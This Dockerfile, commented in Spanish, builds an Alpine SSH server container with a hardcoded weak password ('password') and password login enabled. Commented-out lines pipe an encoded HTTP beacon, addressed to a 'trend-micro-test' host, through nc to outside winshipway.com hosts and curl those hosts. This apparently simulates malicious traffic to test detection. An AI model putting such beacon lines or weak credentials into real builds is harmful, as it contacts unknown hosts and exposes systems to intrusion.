# Usa una imagen base ligera como Alpine
FROM alpine:latest

# Instala OpenSSH y otros paquetes necesarios
RUN apk add --no-cache openssh bash
RUN apk --no-cache add curl

# Crea un usuario para SSH
RUN adduser -D sshuser

# Configura la contraseña para el usuario (por ejemplo, "password")
RUN echo "sshuser:password" | chpasswd

# Permite que el usuario SSH tenga acceso a la shell
RUN mkdir /home/sshuser/.ssh && \
    chmod 700 /home/sshuser/.ssh

# Configura el servidor SSH
RUN ssh-keygen -A
RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config
RUN sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
RUN sed -i 's/#ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/' /etc/ssh/sshd_config

#RUN echo "UE9TVCAvc3VibWl0LnBocD9pZD05NzIxOSBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMDsgTUFOTSkNCkhvc3Q6IHRyZW5kLW1pY3JvLXRlc3QuY29tDQpDb250ZW50LUxlbmd0aDogNTINCkNvbm5lY3Rpb246IEtlZXAtQWxpdmUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlDQoNCgAAADAAAAACAAAAEAAAAB5XSU4xMC0xMTAxDQoAAABOAAAAH0ZoGFBlSM/Ir/A4Z8JZsdY=" | base64 | nc wrs71.winshipway.com 80
#RUN echo "UE9TVCAvc3VibWl0LnBocD9pZD05NzIxOSBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMDsgTUFOTSkNCkhvc3Q6IHRyZW5kLW1pY3JvLXRlc3QuY29tDQpDb250ZW50LUxlbmd0aDogNTINCkNvbm5lY3Rpb246IEtlZXAtQWxpdmUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlDQoNCgAAADAAAAACAAAAEAAAAB5XSU4xMC0xMTAxDQoAAABOAAAAH0ZoGFBlSM/Ir/A4Z8JZsdY=" | base64 | nc wrs49.winshipway.com 80
#RUN echo "UE9TVCAvc3VibWl0LnBocD9pZD05NzIxOSBIVFRQLzEuMQ0KQWNjZXB0OiAqLyoNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzUuMDsgTUFOTSkNCkhvc3Q6IHRyZW5kLW1pY3JvLXRlc3QuY29tDQpDb250ZW50LUxlbmd0aDogNTINCkNvbm5lY3Rpb246IEtlZXAtQWxpdmUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlDQoNCgAAADAAAAACAAAAEAAAAB5XSU4xMC0xMTAxDQoAAABOAAAAH0ZoGFBlSM/Ir/A4Z8JZsdY=" | base64 | nc wrs65.winshipway.com 80

#RUN curl http://wrs49.winshipway.com
#RUN curl http://wrs65.winshipway.com
#RUN curl http://wrs70.winshipway.com 
#RUN curl http://wrs71.winshipway.com 
#RUN curl http://wrs81.winshipway.com 

# Expone el puerto SSH
EXPOSE 22

# Copia el script de automatización al contenedor
COPY automation.sh /usr/local/bin/automation.sh

# Asegúrate de que el script tenga permisos de ejecución
RUN chmod +x /usr/local/bin/automation.sh

# Instala sshpass para manejar contraseñas SSH
RUN apk add --no-cache sshpass

# Inicia el servicio SSH
CMD ["/usr/sbin/sshd", "-D"]
